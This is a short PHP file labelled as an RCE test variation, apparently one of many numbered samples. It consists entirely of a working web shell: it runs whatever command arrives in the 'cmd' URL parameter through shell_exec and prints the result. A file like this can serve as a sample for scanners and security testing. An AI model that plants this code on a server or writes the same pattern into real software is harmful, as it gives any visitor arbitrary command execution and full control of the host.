<?php
// RCE test variation #442
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>